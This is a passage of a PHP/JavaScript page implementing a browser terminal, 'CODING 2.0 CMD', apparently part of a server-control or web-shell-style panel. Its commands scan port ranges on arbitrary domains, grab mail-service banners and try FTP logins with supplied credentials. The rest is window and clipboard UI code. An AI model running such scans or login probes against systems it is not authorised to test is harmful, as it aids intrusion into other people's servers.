                                end = Math.min(65535, parseInt(m[2], 10));
                                if (isNaN(start) || isNaN(end) || end < start) { start = 1; end = 1024; }
                                var span = (end - start + 1);
                                if (span > 2048) { end = start + 2048 - 1; }
                            }
                        }
                        async function run(){
                            for (var s=start; s<=end; s+=batch){
                                var e = Math.min(s + batch - 1, end);
                                print('Scanning ' + String(s) + '-' + String(e), 'sys');
                                try {
                                    var url = '?api=portscan_range&domain=' + encodeURIComponent(domain) + '&start=' + String(s) + '&end=' + String(e);
                                    var r = await fetch(url, { method:'GET', cache:'no-store' });
                                    var j = await r.json();
                                    var pr = Array.isArray(j.ports) ? j.ports : [];
                                    attempted += (e - s + 1);
                                    if (pr.length){
                                        for (var i=0;i<pr.length;i++){
                                            var p = pr[i];
                                            openCount++;
                                            printHtml('PORT ' + String(p.port) + ' <span class="port-badge open">OPEN</span>', 'ok');
                                        }
                                    }
                                } catch(_) {
                                    print('scanall: batch failed ' + String(s) + '-' + String(e), 'err');
                                }
                            }
                            var closed = Math.max(0, attempted - openCount);
                            printHtml('Open: ' + String(openCount) + ' <span class="port-badge open">OPEN</span>', 'sys');
                            printHtml('Closed: ' + String(closed) + ' <span class="port-badge closed">CLOSED</span>', 'sys');
                        }
                        run();
                        return;
                    }
                    if (cmd === 'scanmail') {
                        var domainM = (args[0] || '').trim();
                        if (!domainM) { print('scanmail: domain required', 'err'); return; }
                        var urlM = '?api=mailports&domain=' + encodeURIComponent(domainM);
                        fetch(urlM, { method:'GET', cache:'no-store' })
                            .then(function(r){ var ct = r.headers.get('content-type') || ''; if (ct.indexOf('application/json') !== -1) { return r.json(); } return { success:false, error:'Invalid response' }; })
                            .then(function(j){
                                if (j && j.success) {
                                    var d = j.domain || domainM;
                                    print('Domain: ' + d, 'sys');
                                    var pr = Array.isArray(j.ports) ? j.ports : [];
                                    var names = { imap_ssl:'IMAP SSL (993)', imap:'IMAP (143)', pop3_ssl:'POP3 SSL (995)', pop3:'POP3 (110)', smtp_ssl:'SMTP SSL (465)', smtp:'SMTP (587)', webmail_https:'Webmail HTTPS (2096)', webmail_http:'Webmail HTTP (2095)' };
                                    pr.forEach(function(r){
                                        var label = names[r.service] || ('Port ' + String(r.port));
                                        var html = label + ' ' + (r.open ? '<span class="port-badge open">OPEN</span>' : '<span class="port-badge closed">CLOSED</span>');
                                        if (r.open && r.banner) { html += ' — ' + String(r.banner).replace(/[<>]/g,''); }
                                        printHtml(html, r.open ? 'ok' : 'sys');
                                    });
                                    var anyOpen = pr.some(function(r){ return r && r.open; });
                                    if (!anyOpen) {
                                        (async function(){
                                            var candidates = [ 'mail.' + d, 'webmail.' + d, 'imap.' + d, 'pop.' + d, 'smtp.' + d ];
                                            try {
                                                var r1 = await fetch('?api=nslookup&domain=' + encodeURIComponent(d), { method:'GET', cache:'no-store' });
                                                var j1 = await r1.json();
                                                var mxs = (j1 && Array.isArray(j1.mx)) ? j1.mx : [];
                                                for (var i=0;i<mxs.length;i++){
                                                    var h = (mxs[i] && (mxs[i].host||mxs[i].target)) ? (mxs[i].host||mxs[i].target) : '';
                                                    if (h) candidates.push(h);
                                                }
                                            } catch(_){ }
                                            var seen = {};
                                            for (var k=0;k<candidates.length;k++){
                                                var host = candidates[k];
                                                if (!host || seen[host]) continue; seen[host] = true;
                                                try {
                                                    var r2 = await fetch('?api=mailports&domain=' + encodeURIComponent(host), { method:'GET', cache:'no-store' });
                                                    var j2 = await r2.json();
                                                    var pr2 = (j2 && Array.isArray(j2.ports)) ? j2.ports : [];
                                                    if (pr2.length) {
                                                        print('Host: ' + (j2.domain || host), 'sys');
                                                        for (var m=0;m<pr2.length;m++){
                                                            var rr = pr2[m];
                                                            var lb = names[rr.service] || ('Port ' + String(rr.port));
                                                            var h2 = lb + ' ' + (rr.open ? '<span class="port-badge open">OPEN</span>' : '<span class="port-badge closed">CLOSED</span>');
                                                            if (rr.open && rr.banner) { h2 += ' — ' + String(rr.banner).replace(/[<>]/g,''); }
                                                            printHtml(h2, rr.open ? 'ok' : 'sys');
                                                        }
                                                        var open2 = pr2.some(function(x){ return x && x.open; });
                                                        if (open2) { print('Use the open host above for mail login.', 'sys'); break; }
                                                    }
                                                } catch(_){ }
                                            }
                                        })();
                                    }
                                    print('Use IMAP/POP3/SMTP with your email and password.', 'sys');
                                } else {
                                    var emsg = (j && j.error) ? j.error : 'Scan failed';
                                    print('ERROR: ' + emsg, 'err');
                                }
                            })
                            .catch(function(){ print('ERROR: network error', 'err'); });
                        return;
                    }
                    if (cmd === 'ftpcheck') {
                        var domainF = (args[0] || '').trim();
                        if (!domainF) { print('ftpcheck: domain required', 'err'); return; }
                        var portsArg = '';
                        var explicit = false; var userF = ''; var passF = '';
                        for (var i=1;i<args.length;i++){
                            var a = args[i];
                            if (a.indexOf('--explicit') !== -1) { explicit = true; }
                            else if (a.indexOf('--user=') === 0) { userF = a.slice(7); }
                            else if (a.indexOf('--pass=') === 0) { passF = a.slice(7); }
                            else { portsArg = a; }
                        }
                        var qs = '?api=ftpcheck&domain=' + encodeURIComponent(domainF);
                        if (portsArg) { portsArg = portsArg.replace(/[^0-9,]/g,''); if (portsArg) qs += '&ports=' + encodeURIComponent(portsArg); }
                        if (explicit) { qs += '&explicit=1'; }
                        if (userF) { qs += '&user=' + encodeURIComponent(userF); }
                        if (passF) { qs += '&pass=' + encodeURIComponent(passF); }
                        fetch(qs, { method:'GET', cache:'no-store' })
                            .then(function(r){ var ct = r.headers.get('content-type') || ''; if (ct.indexOf('application/json') !== -1) { return r.json(); } return { success:false, error:'Invalid response' }; })
                            .then(function(j){
                                if (j && j.success) {
                                    var d = j.domain || domainF;
                                    print('Domain: ' + d, 'sys');
                                    var pr = Array.isArray(j.ports) ? j.ports : [];
                                    pr.forEach(function(r){
                                        var name = (r.mode==='ftps_implicit') ? 'FTPS (990)' : ((r.mode==='ftp_explicit') ? 'FTP EXPLICIT TLS (21)' : ('FTP (' + String(r.port) + ')'));
                                        var html = name + ' ' + (r.open ? '<span class="port-badge open">OPEN</span>' : '<span class="port-badge closed">CLOSED</span>');
                                        if (r.open && r.banner) { html += ' — ' + String(r.banner).replace(/[<>]/g,''); }
                                        if (r.open && r.auth && r.auth !== 'skipped') { html += ' — auth ' + r.auth; }
                                        printHtml(html, r.open ? 'ok' : 'sys');
                                    });
                                    print('Connect with an FTP/FTPS client using the open port.', 'sys');
                                } else {
                                    var emsg = (j && j.error) ? j.error : 'Scan failed';
                                    print('ERROR: ' + emsg, 'err');
                                }
                            })
                            .catch(function(){ print('ERROR: network error', 'err'); });
                        return;
                    }
                    if (cmd === 'trash') {
                        var showLast = (args.indexOf('--last') !== -1) || (args.indexOf('-l') !== -1);
                        var openTracer = (args.indexOf('tracer') !== -1);
                        try {
                            fetch('?api=trash_recent', { credentials:'same-origin' })
                                .then(function(resp){ return resp.json(); })
                                .then(function(data){
                                    var items = (data && data.items) ? data.items : [];
                                    if (showLast) {
                                        var it = items.length ? items[items.length - 1] : null;
                                        if (it) {
                                            var when = it.ts ? new Date(it.ts * 1000).toLocaleString() : '';
                                            var line = 'trash ' + (it.type || 'file') + ' "' + (it.name || '') + '"' + (it.path ? (' (' + it.path + ')') : '') + (when ? (' — ' + when) : '');
                                            print(line, 'ok');
                                        } else {
                                            print('No deleted items found', 'sys');
                                        }
                                    } else {
                                        var recent = items.slice(Math.max(0, items.length - 10));
                                        if (!recent.length) { print('No deleted items found', 'sys'); }
                                        for (var i=0;i<recent.length;i++){
                                            var it2 = recent[i];
                                            var line2 = 'trash ' + (it2.type || 'file') + ' "' + (it2.name || '') + '"' + (it2.path ? (' (' + it2.path + ')') : '');
                                            print(line2, 'ok');
                                        }
                                    }
                                    if (openTracer) {
                                        try { if (typeof spawnTrashWindow === 'function') spawnTrashWindow(); } catch(e){}
                                    }
                                })
                                .catch(function(){ print('ERROR: unable to load trash', 'err'); });
                        } catch(e) { print('ERROR: unable to load trash', 'err'); }
                        return;
                    }
                    print('Command not found: ' + cmd, 'err');
                } catch(e){ print('error: ' + (e && e.message ? e.message : String(e)), 'err'); }
            }

            if (!savedHtml) {
                print('┏━╸┏┳┓╺┳┓   ┏━┓┏━┓┏━┓   ┏━┓ ┏━┓', 'logo');
                print('┃  ┃┃┃ ┃┃   ┣━┫┣━┛┣━┛   ┏━┛ ┃┃┃', 'logo');
                print('┗━╸╹ ╹╺┻┛   ╹ ╹╹  ╹     ┗━╸╹┗━┛', 'logo');
                print('CODING 2.0 CMD — type "help" for commands', 'sys');
            }

            // Hide traditional input row; use live typing inside output
            if (inputRow) inputRow.style.display = 'none';
            var live = output.querySelector('.cmd-live');
            if (!live) {
                live = document.createElement('div');
                live.className = 'cmd-live';
                live.innerHTML = '<span class="cmd-prompt"><span class="sym">(</span><span class="u">oscoding</span>@<span class="h">root</span><span class="sym">)</span><span class="dir">[~]</span> <span class="sym">$</span></span> <span class="cmd-typed"></span><span class="cmd-cursor"></span>';
                output.appendChild(live);
            }
            var typedSpan = live.querySelector('.cmd-typed');
            var typedBuffer = typedSpan ? (typedSpan.textContent || '') : '';
            try { localStorage.setItem('cmd.output', output.innerHTML); } catch(e){}

            // Focus window to capture keystrokes
            win.setAttribute('tabindex', '0');
            try { win.focus(); } catch(e){}
            output.addEventListener('click', function(){ try { win.focus(); } catch(e){} });
            titlebar && titlebar.addEventListener('click', function(){ try { win.focus(); } catch(e){} });
            btnPaste && btnPaste.addEventListener('click', function(){ try{ window.setPasteTarget && window.setPasteTarget(win); window.openPaste && window.openPaste(); }catch(e){} });
            btnCopy && btnCopy.addEventListener('click', function(){
                try {
                    var sel = window.getSelection();
                    var text = '';
                    if (sel && String(sel)) { text = String(sel); }
                    if (!text) {
                        var typed = win.querySelector('.cmd-live .cmd-typed');
                        text = typed ? (typed.textContent||'') : '';
                    }
                    if (!text) {
                        var lines = win.querySelectorAll('.cmd-output > div');
                        if (lines && lines.length) {
                            var last = lines[lines.length - 1];
                            if (last && !last.classList.contains('cmd-live')) { text = last.textContent || ''; }
                        }
                    }
                    if (!text) return;
                    if (navigator.clipboard && navigator.clipboard.writeText) { navigator.clipboard.writeText(text); return; }
                    var ta=document.createElement('textarea'); ta.style.position='fixed'; ta.style.opacity='0'; ta.value=text; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); document.body.removeChild(ta);
                } catch(e){}
            });

            function doPaste(val){
                if (!val) return;
                typedBuffer += val;
                typedSpan.textContent = typedBuffer;
                try { localStorage.setItem('cmd.output', output.innerHTML); } catch(e){}
            }
            try { win.doPaste = doPaste; } catch(_){}
            try {
                win.execTyped = function(){
                    if (!typedSpan) return;
                    var cmd = (typedBuffer || '').trim();
                    if (!cmd) return;
                    print('$ ' + cmd);
                    process(cmd);
                    typedBuffer = '';
                    typedSpan.textContent = '';
                    try { localStorage.setItem('cmd.output', output.innerHTML); } catch(e){}
                };
            } catch(_){}
            win.addEventListener('paste', function(e){
                var t = '';
                try { if (e.clipboardData && e.clipboardData.getData) { t = e.clipboardData.getData('text'); } } catch(_){}
                if (!t && window.clipboardData) { try { t = window.clipboardData.getData('Text'); } catch(_){} }
                if (t) { e.preventDefault(); doPaste(t); }
            });
            function handleKey(e){
                // Allow basic typing, backspace, and enter
                if ((e.ctrlKey || e.metaKey) && (String(e.key||'').toLowerCase() === 'c')) {
                    e.preventDefault();
                    try {
                        var sel = window.getSelection();
                        var text = '';
                        if (sel && String(sel)) { text = String(sel); }
                        if (!text) {
                            var typedEl = win.querySelector('.cmd-live .cmd-typed');
                            text = typedEl ? (typedEl.textContent || '') : '';
                        }
                        if (!text) {
                            var lines = win.querySelectorAll('.cmd-output > div');
                            if (lines && lines.length) {
                                var last = lines[lines.length - 1];
                                if (last && !last.classList.contains('cmd-live')) { text = last.textContent || ''; }
                            }
                        }
                        if (!text) return;
                        if (navigator.clipboard && navigator.clipboard.writeText) { navigator.clipboard.writeText(text).catch(function(){}); }
                        else {
                            var ta=document.createElement('textarea'); ta.style.position='fixed'; ta.style.opacity='0'; ta.value=text; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); document.body.removeChild(ta);
                        }
                    } catch(_){}
                    return;
                }
                if ((e.ctrlKey || e.metaKey) && (String(e.key||'').toLowerCase() === 'v')) {
                    e.preventDefault();
                    try { navigator.clipboard && navigator.clipboard.readText().then(function(t){ if (t) doPaste(t); }); } catch(_){}
                    return;
                }
                if (e.key === 'Enter') {
                    e.preventDefault();
                    if (typedBuffer.trim()) {
                        print('$ ' + typedBuffer);
                        process(typedBuffer);
                        typedBuffer = '';
                        typedSpan.textContent = '';
                        try { localStorage.setItem('cmd.output', output.innerHTML); } catch(e){}
                    }
                    return;
                }
                if (e.key === 'Backspace') {
                    e.preventDefault();
                    if (typedBuffer.length > 0) {
                        typedBuffer = typedBuffer.slice(0, -1);
                        typedSpan.textContent = typedBuffer;
                        try { localStorage.setItem('cmd.output', output.innerHTML); } catch(e){}
                    }
                    return;
                }
                // Ignore control keys
                if (e.ctrlKey || e.metaKey || e.altKey) return;
                if (e.key.length === 1) {
                    // Regular printable character
                    typedBuffer += e.key;
                    typedSpan.textContent = typedBuffer;
                    e.preventDefault();
                    try { localStorage.setItem('cmd.output', output.innerHTML); } catch(e){}
                }
            }
            win.addEventListener('keydown', handleKey);

            // Drag handling
            var drag = { active:false, offsetX:0, offsetY:0 };
            function onMouseDown(e){
                drag.active = true;
                var rect = win.getBoundingClientRect();
                drag.offsetX = e.clientX - rect.left;
                drag.offsetY = e.clientY - rect.top;
                document.addEventListener('mousemove', onMouseMove);
                document.addEventListener('mouseup', onMouseUp);
            }
            function onMouseMove(e){
                if (!drag.active) return;
                var x = Math.max(6, Math.min(window.innerWidth - win.offsetWidth - 6, e.clientX - drag.offsetX));
                var y = Math.max(6, Math.min(window.innerHeight - win.offsetHeight - 6, e.clientY - drag.offsetY));
                win.style.left = x + 'px';
                win.style.top = y + 'px';
            }
            function onMouseUp(){
                drag.active = false;
                document.removeEventListener('mousemove', onMouseMove);
                document.removeEventListener('mouseup', onMouseUp);
                // Persist last position
                try {
                    var rect = win.getBoundingClientRect();
                    localStorage.setItem('cmd.left', String(Math.round(rect.left)));
                    localStorage.setItem('cmd.top', String(Math.round(rect.top)));
                } catch(e) {}
            }
            titlebar && titlebar.addEventListener('mousedown', onMouseDown);

            // Close
            closeBtn && closeBtn.addEventListener('click', function(){
                win.removeEventListener('keydown', handleKey);
                win.remove();
                try { localStorage.removeItem('cmd.output'); } catch(e){}
                try { window.removeOpenApp && window.removeOpenApp('cmd'); } catch(e){}
                try { if (window.activeCmdWin === win) window.activeCmdWin = null; } catch(e){}
            });

            // Traditional input disabled in favor of live typing; keep no-op

            return win;
        }
        cmdTrigger && cmdTrigger.addEventListener('click', function(e){ e.preventDefault(); spawnCmdWindow(); });

        // CMD-style notification popup
        function spawnCmdNotify(message, isError){
            if (!cmdNotifyTemplate || !cmdNotifyLayer) return null;
            var win = cmdNotifyTemplate.cloneNode(true);
            win.removeAttribute('id');
            win.style.display = '';
            win.classList.add('show');
            cmdNotifyLayer.appendChild(win);
            // Center
            try {
                var cw = win.offsetWidth || 560;
                var ch = win.offsetHeight || 220;
                var left = Math.max(6, Math.min(window.innerWidth - cw - 6, Math.round((window.innerWidth - cw) / 2)));
                var top = Math.max(6, Math.min(window.innerHeight - ch - 6, Math.round((window.innerHeight - ch) / 2)));
                win.style.left = left + 'px';
                win.style.top = top + 'px';
            } catch(e) {}
            var titlebar = win.querySelector('.cmd-titlebar');
            var closeBtn = win.querySelector('.cmd-close');
            var output = win.querySelector('.cmd-notify-output');
            var body = win.querySelector('.cmd-notify-body');
            var iconWrap = document.createElement('div');
            iconWrap.className = 'cmd-notify-icon';
            iconWrap.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="32" height="32" viewBox="0,0,256,256"><g fill="#7fff00" fill-rule="nonzero" stroke="none" stroke-width="1" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="10" stroke-dasharray="" stroke-dashoffset="0" font-family="none" font-weight="none" font-size="none" text-anchor="none" style="mix-blend-mode: normal"><g transform="scale(10.66667,10.66667)"><path d="M21.707,2.293c-0.3905,-0.39038 -1.0235,-0.39038 -1.414,0l-3.2,3.2c-1.52321,-0.96732 -3.28861,-1.48485 -5.093,-1.493c-4.326,0 -8.227,3.005 -9.938,7.654c-0.08297,0.22321 -0.08297,0.46879 0,0.692c0.6744,1.87887 1.78599,3.57041 3.243,4.935l-3.012,3.012c-0.25996,0.25107 -0.36421,0.62288 -0.2727,0.97251c0.09152,0.34963 0.36456,0.62267 0.71419,0.71419c0.34963,0.09152 0.72143,-0.01274 0.97251,-0.2727l3.2,-3.2c1.52321,0.96732 3.28861,1.48485 5.093,1.493c4.326,0 8.227,-3 9.938,-7.654c0.08297,-0.22321 0.08297,-0.46879 0,-0.692c-0.67296,-1.87837 -1.7828,-3.56987 -3.238,-4.935l3.012,-3.012c0.389,-0.39188 0.38677,-1.02488 -0.005,-1.414zM6.734,15.852c-1.16746,-1.06596 -2.07767,-2.38306 -2.662,-3.852c1.477,-3.657 4.554,-6 7.928,-6c1.27188,0.00561 2.52154,0.33385 3.632,0.954l-1.613,1.613c-0.60956,-0.3676 -1.30718,-0.56352 -2.019,-0.567c-2.20914,0 -4,1.79086 -4,4c0.00348,0.71182 0.1994,1.40944 0.567,2.019zM13.925,11.489c0.04743,0.16628 0.07265,0.3381 0.075,0.511c0,1.10457 -0.89543,2 -2,2c-0.1729,-0.00235 -0.34472,-0.02757 -0.511,-0.075zM10.075,12.511c-0.04743,-0.16628 -0.07265,-0.3381 -0.075,-0.511c0,-1.10457 0.89543,-2 2,-2c0.1729,0.00235 0.34472,0.02757 0.511,0.075zM19.928,12c-1.477,3.657 -4.554,6 -7.928,6c-1.27188,-0.00561 -2.52154,-0.33385 -3.632,-0.954l1.613,-1.613c0.60956,0.3676 1.30718,0.56352 2.019,0.567c2.20914,0 4,-1.79086 4,-4c-0.00348,-0.71182 -0.1994,-1.40944 -0.567,-2.019l1.833,-1.833c1.16746,1.06596 2.07767,2.38306 2.662,3.852z"></path></g></g></svg>';
            if (body) { body.insertBefore(iconWrap, output); }
            function print(line, cls){ var div = document.createElement('div'); if (cls) div.className = cls; div.textContent = line; output.appendChild(div); }
            // Compose message lines
            print('CODING 2.0 CMD', 'sys');
            if (isError) {
                var msgStr = String(message||'');
                if (msgStr.indexOf('Unlock failed: unable to change permissions in this environment (abs).') !== -1) {
                    var div = document.createElement('div');
                    div.className = 'err';
                    div.textContent = 'ERROR: ' + msgStr;
                    div.style.color = 'Crimson';
                    output.appendChild(div);
                } else {
                    print('ERROR: ' + msgStr, 'err');
                }
            }
            else { print(String(message||''), 'connected'); }
            // Drag handling
            var drag = { active:false, offsetX:0, offsetY:0 };
            function onMouseDown(e){ drag.active = true; var rect = win.getBoundingClientRect(); drag.offsetX = e.clientX - rect.left; drag.offsetY = e.clientY - rect.top; document.addEventListener('mousemove', onMouseMove); document.addEventListener('mouseup', onMouseUp); }
            function onMouseMove(e){ if (!drag.active) return; var x = Math.max(6, Math.min(window.innerWidth - win.offsetWidth - 6, e.clientX - drag.offsetX)); var y = Math.max(6, Math.min(window.innerHeight - win.offsetHeight - 6, e.clientY - drag.offsetY)); win.style.left = x + 'px'; win.style.top = y + 'px'; }
            function onMouseUp(){ drag.active = false; document.removeEventListener('mousemove', onMouseMove); document.removeEventListener('mouseup', onMouseUp); }
            titlebar && titlebar.addEventListener('mousedown', onMouseDown);
            // Close
            closeBtn && closeBtn.addEventListener('click', function(){ win.remove(); });
            try { window.spawnCmdNotify = spawnCmdNotify; } catch(e){}
            return win;
        }
        function spawnConnectedNotify(ip, name, flag, since){
            if (!cmdNotifyTemplate || !cmdNotifyLayer) return null;
            var win = cmdNotifyTemplate.cloneNode(true);
            win.removeAttribute('id');
            win.style.display = '';
            win.classList.add('show');
            cmdNotifyLayer.appendChild(win);
            try {
                var savedLeft = parseInt(localStorage.getItem('connected.left') || '', 10);
                var savedTop = parseInt(localStorage.getItem('connected.top') || '', 10);
                var cw = win.offsetWidth || 560;
                var ch = win.offsetHeight || 220;
                var left, top;
                if (!isNaN(savedLeft) && !isNaN(savedTop)) {
                    left = Math.max(6, Math.min(window.innerWidth - cw - 6, savedLeft));
                    top = Math.max(6, Math.min(window.innerHeight - ch - 6, savedTop));
                } else {
                    left = Math.max(6, Math.min(window.innerWidth - cw - 6, Math.round((window.innerWidth - cw) / 2)));
                    top = Math.max(6, Math.min(window.innerHeight - ch - 6, Math.round((window.innerHeight - ch) / 2)));
                }
                win.style.left = left + 'px';
                win.style.top = top + 'px';
            } catch(e) {}
            var titlebar = win.querySelector('.cmd-titlebar');
            var closeBtn = win.querySelector('.cmd-close');
            var output = win.querySelector('.cmd-notify-output');
            var body = win.querySelector('.cmd-notify-body');
            var iconWrap = document.createElement('div');
            iconWrap.className = 'cmd-notify-icon';
            iconWrap.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="32" height="32" viewBox="0,0,256,256"><g fill="#7fff00" fill-rule="nonzero" stroke="none" stroke-width="1" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="10" stroke-dasharray="" stroke-dashoffset="0" font-family="none" font-weight="none" font-size="none" text-anchor="none" style="mix-blend-mode: normal"><g transform="scale(10.66667,10.66667)"><path d="M21.707,2.293c-0.3905,-0.39038 -1.0235,-0.39038 -1.414,0l-3.2,3.2c-1.52321,-0.96732 -3.28861,-1.48485 -5.093,-1.493c-4.326,0 -8.227,3.005 -9.938,7.654c-0.08297,0.22321 -0.08297,0.46879 0,0.692c0.6744,1.87887 1.78599,3.57041 3.243,4.935l-3.012,3.012c-0.25996,0.25107 -0.36421,0.62288 -0.2727,0.97251c0.09152,0.34963 0.36456,0.62267 0.71419,0.71419c0.34963,0.09152 0.72143,-0.01274 0.97251,-0.2727l3.2,-3.2c1.52321,0.96732 3.28861,1.48485 5.093,1.493c4.326,0 8.227,-3 9.938,-7.654c0.08297,-0.22321 0.08297,-0.46879 0,-0.692c-0.67296,-1.87837 -1.7828,-3.56987 -3.238,-4.935l3.012,-3.012c0.389,-0.39188 0.38677,-1.02488 -0.005,-1.414zM6.734,15.852c-1.16746,-1.06596 -2.07767,-2.38306 -2.662,-3.852c1.477,-3.657 4.554,-6 7.928,-6c1.27188,0.00561 2.52154,0.33385 3.632,0.954l-1.613,1.613c-0.60956,-0.3676 -1.30718,-0.56352 -2.019,-0.567c-2.20914,0 -4,1.79086 -4,4c0.00348,0.71182 0.1994,1.40944 0.567,2.019zM13.925,11.489c0.04743,0.16628 0.07265,0.3381 0.075,0.511c0,1.10457 -0.89543,2 -2,2c-0.1729,-0.00235 -0.34472,-0.02757 -0.511,-0.075zM10.075,12.511c-0.04743,-0.16628 -0.07265,-0.3381 -0.075,-0.511c0,-1.10457 0.89543,-2 2,-2c0.1729,0.00235 0.34472,0.02757 0.511,0.075zM19.928,12c-1.477,3.657 -4.554,6 -7.928,6c-1.27188,-0.00561 -2.52154,-0.33385 -3.632,-0.954l1.613,-1.613c0.60956,0.3676 1.30718,0.56352 2.019,0.567c2.20914,0 4,-1.79086 4,-4c-0.00348,-0.71182 -0.1994,-1.40944 -0.567,-2.019l1.833,-1.833c1.16746,1.06596 2.07767,2.38306 2.662,3.852z"></path></g></g></svg>';
            if (body) { body.insertBefore(iconWrap, output); }
            var header = document.createElement('div');
            header.className = 'sys';
            header.textContent = 'CODING 2.0 CMD';
            output.appendChild(header);
            var line = document.createElement('div');
            line.className = 'connected';
            var countryText = name ? ('[' + String(name) + ']') : '';
            var flagText = flag ? (' ' + String(flag)) : '';
            line.innerHTML = 'Connected : IP ~ <span class="ip"></span> ' + countryText + flagText + ' Online: <span class="uptime"></span>';
            output.appendChild(line);
            line.querySelector('.ip').textContent = String(ip||'');
            var sinceTs = Number(since||0);
            try { localStorage.setItem('connected.open', '1'); localStorage.setItem('connected.since', String(sinceTs)); } catch(_){}
            function update(){ var s = Math.max(0, Math.floor(Date.now()/1000) - sinceTs); var m = Math.floor(s/60); var sec = s%60; var el = line.querySelector('.uptime'); if (el) el.textContent = String(m) + 'm ' + String(sec) + 's'; }
            update();
            var timerId = setInterval(update, 1000);
            var drag = { active:false, offsetX:0, offsetY:0 };
            function onMouseDown(e){ drag.active = true; var rect = win.getBoundingClientRect(); drag.offsetX = e.clientX - rect.left; drag.offsetY = e.clientY - rect.top; document.addEventListener('mousemove', onMouseMove); document.addEventListener('mouseup', onMouseUp); }
            function onMouseMove(e){ if (!drag.active) return; var x = Math.max(6, Math.min(window.innerWidth - win.offsetWidth - 6, e.clientX - drag.offsetX)); var y = Math.max(6, Math.min(window.innerHeight - win.offsetHeight - 6, e.clientY - drag.offsetY)); win.style.left = x + 'px'; win.style.top = y + 'px'; }
            function onMouseUp(){ drag.active = false; try { var rect = win.getBoundingClientRect(); localStorage.setItem('connected.left', String(Math.round(rect.left))); localStorage.setItem('connected.top', String(Math.round(rect.top))); } catch(_){} document.removeEventListener('mousemove', onMouseMove); document.removeEventListener('mouseup', onMouseUp); }
            titlebar && titlebar.addEventListener('mousedown', onMouseDown);
            closeBtn && closeBtn.addEventListener('click', function(){ try{ clearInterval(timerId); }catch(_){ } try { localStorage.setItem('connected.open', '0'); } catch(_){} win.remove(); });
            try { window.spawnConnectedNotify = spawnConnectedNotify; } catch(e){}
            try { window.connectedWin = win; } catch(e){}
            return win;
        }
        // On-load: show server-side error only as popup (no body notifications)
        try {
            var ERR_MSG = <?php echo json_encode((string)($error ?? '')); ?>;
            if (ERR_MSG) { if (typeof spawnCmdNotify === 'function') spawnCmdNotify(ERR_MSG, true); }
        } catch(e){}

        (function(){
            function pickName(cc){
                try {
                    var code = String(cc||'').toUpperCase();
                    if (!code) return '';
                    var dn = null; try { dn = new Intl.DisplayNames(['en'], { type:'region' }); } catch(_){}
                    if (dn) { var n = dn.of(code); if (n && n !== code) return n; }
                    return code;
                } catch(_){ return String(cc||''); }
            }
            function flagEmoji(cc){ try { cc=String(cc||'').toUpperCase(); if (cc.length!==2) return ''; var OFFSET=127397; return String.fromCodePoint(cc.charCodeAt(0)+OFFSET, cc.charCodeAt(1)+OFFSET); } catch(_){ return ''; } }
            try {
                fetch('?api=session_info', { credentials:'same-origin' })
                    .then(function(r){ try { return r.json(); } catch(_){ return null; } })
                    .then(function(j){
                        if (!j || !j.success) return;
                        var s = Number(j.elapsed||0);
                        var m = Math.floor(s/60);
                        var sec = s%60;
                        var isLocal = (String(j.ip||'') === '127.0.0.1' || String(j.ip||'') === '::1');
                        var name = j.country || pickName(j.code) || (isLocal ? 'Localhost' : 'Unknown');
                        var f = j.flag || flagEmoji(j.code);
                        var flag = f ? (' ' + f) : '';
                        var sinceVal = Number(j.since||0);
                        if (!sinceVal) { try { sinceVal = Number(localStorage.getItem('connected.since')||'0'); } catch(_){} }
                        var wasOpen = (function(){ try { return localStorage.getItem('connected.open') === '1'; } catch(_){ return false; } })();
                        if (wasOpen) {
                            if (typeof spawnConnectedNotify === 'function') {
                                try { if (!(window.connectedWin && document.body.contains(window.connectedWin))) { spawnConnectedNotify(String(j.ip||''), String(name||''), String(flag||''), sinceVal); } } catch(_){ spawnConnectedNotify(String(j.ip||''), String(name||''), String(flag||''), sinceVal); }
                            }
                        } else if (j.show) {
                            setTimeout(function(){ if (typeof spawnConnectedNotify === 'function') { spawnConnectedNotify(String(j.ip||''), String(name||''), String(flag||''), sinceVal); } }, 5000);
                        }
                            try {
                                function ensureConnectedReminder(ip, name, flag, since){
                                    var nextAt = Number(localStorage.getItem('connected.nextAt')||'0');
                                    if (!nextAt || nextAt < Number(since||0)) { nextAt = Number(since||0) + 1800; localStorage.setItem('connected.nextAt', String(nextAt)); }
                                    function check(){
                                        var now = Math.floor(Date.now()/1000);
                                        var isOpen = localStorage.getItem('connected.open') === '1';
                                        if (now >= nextAt) {
                                            if (!isOpen && typeof spawnConnectedNotify === 'function') {
                                                try { if (!(window.connectedWin && document.body.contains(window.connectedWin))) { spawnConnectedNotify(String(ip||''), String(name||''), String(flag||''), Number(since||0)); } } catch(_){ spawnConnectedNotify(String(ip||''), String(name||''), String(flag||''), Number(since||0)); }
                                            }
                                            nextAt = now + 1800;
                                            localStorage.setItem('connected.nextAt', String(nextAt));
                                        }
                                    }
                                    setInterval(check, 60000);
                                }
                                ensureConnectedReminder(String(j.ip||''), String(name||''), String(flag||''), sinceVal);
                            } catch(_){}
                    })
                    .catch(function(){});
            } catch(_){ }
        })();

        // Trash popup: list all deleted items (persistent + auto-refresh)
        async function spawnTrashWindow(){
            if (!cmdNotifyTemplate || !cmdNotifyLayer) return null;
            // If already open, return the existing window
            try {
                if (window.trashWin && document.body.contains(window.trashWin)) {
                    return window.trashWin;
                }
            } catch(e){}
            var win = cmdNotifyTemplate.cloneNode(true);
            win.removeAttribute('id');
            win.style.display = '';
            win.classList.add('show');
            cmdNotifyLayer.appendChild(win);
            // Restore saved position or center
            try {
                var savedLeft = parseInt(localStorage.getItem('trash.left') || '', 10);
                var savedTop = parseInt(localStorage.getItem('trash.top') || '', 10);
                var cw = win.offsetWidth || 560;
                var ch = win.offsetHeight || 260;
                if (!isNaN(savedLeft) && !isNaN(savedTop)) {
                    var left = Math.max(6, Math.min(window.innerWidth - cw - 6, savedLeft));
                    var top = Math.max(6, Math.min(window.innerHeight - ch - 6, savedTop));
                    win.style.left = left + 'px';
                    win.style.top = top + 'px';
                } else {
                    var left2 = Math.max(6, Math.min(window.innerWidth - cw - 6, Math.round((window.innerWidth - cw) / 2)));
                    var top2 = Math.max(6, Math.min(window.innerHeight - ch - 6, Math.round((window.innerHeight - ch) / 2)));
                    win.style.left = left2 + 'px';
                    win.style.top = top2 + 'px';
                }
